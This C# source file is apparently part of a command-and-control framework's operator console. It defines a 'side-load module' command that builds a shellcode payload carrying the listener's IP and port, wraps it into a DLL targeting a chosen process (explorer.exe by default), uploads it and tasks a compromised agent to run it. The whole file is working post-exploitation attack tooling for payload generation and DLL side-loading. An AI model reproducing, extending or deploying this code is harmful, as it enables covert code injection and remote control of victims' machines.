using ApiModels.Requests;
using ApiModels.Response;
using Commander.Commands;
using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.SideLoad
{

    public class SiteLoadModuleCommandOptions
    {
        public string parameters { get; set; }
        public string processName { get; set; }
        public bool verbose { get; set; }
    }

    public abstract class SiteLoadModuleCommand : EnhancedCommand<SiteLoadModuleCommandOptions>
    {
        public override string Category => CommandCategory.Module;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public virtual string ModuleName { get; set; }

        public virtual string ComputeParams(string innerParams)
        {
            return innerParams;
        }

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("parameters", () => string.Empty, "parameters to use"),
            new Option<string>(new[] { "--processName", "-p" }, () => "explorer.exe" ,"process name to start."),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<SiteLoadModuleCommandOptions> context)
        {

            var listenerId = context.Executor.CurrentAgent.ListenerId;
            //if(context.Options.verbose)
            //{
            //    context.Terminal.WriteLine("listener = " + listenerId ?? string.Empty);
            //}

            var listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Id == listenerId);
            if (listener == null)
            {
                context.Terminal.WriteError("No listener found !");
                return false;
            }

            var taskId = Guid.NewGuid().ToString();
            var taskCmd = "side-load-module";
            //Generate parameters
            ExecutionContext exeCtxt = new ExecutionContext()
            {
                i = listener.Ip,
                p = listener.BindPort,
                s = listener.Secured ? "y" : "n",
                id = taskId,
                a = this.ComputeParams(context.Options.parameters)
            };

            var ser = JsonConvert.SerializeObject(exeCtxt);

            if (context.Options.verbose)
                context.Terminal.WriteLine($"Parameters Serialized = {ser}");

            var parms = Convert.ToBase64String(Encoding.UTF8.GetBytes(ser));
            if (parms.Length > 250)
            {
                context.Terminal.WriteError("Parameters too long.");
                return false;
            }

            context.Terminal.WriteLine($"Generating bin payload with params {parms}...");
            var result = InjectCommand.GenerateBin(Path.Combine(InjectCommand.ModuleFolder, this.ModuleName), parms, out var binFileName);
            if (context.Options.verbose)
                context.Terminal.WriteLine(result);

            if (string.IsNullOrEmpty(context.Options.processName))
            {
                context.Terminal.WriteLine("processName is null");
                context.Options.processName = "explorer.exe";
            }
            context.Terminal.WriteLine($"Generating dll from bin...");
            result = SiteLoadCommand.GenerateDllFromBin(binFileName, context.Options.processName, out var dllFileName);
            if (context.Options.verbose)
                context.Terminal.WriteLine(result);

            File.Delete(binFileName);

            context.Terminal.WriteLine($"Pushing {dllFileName} to the server...");

            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(dllFileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, dllFileName, a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });

            File.Delete(dllFileName);
            string fileName = Path.GetFileName(dllFileName);
            //context.Terminal.WriteLine(fileName);

            await context.CommModule.TaskAgent(context.CommandLabel, taskId, context.Executor.CurrentAgent.Metadata.Id, taskCmd, fileId, fileName);
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
            return true;
        }
    }
}
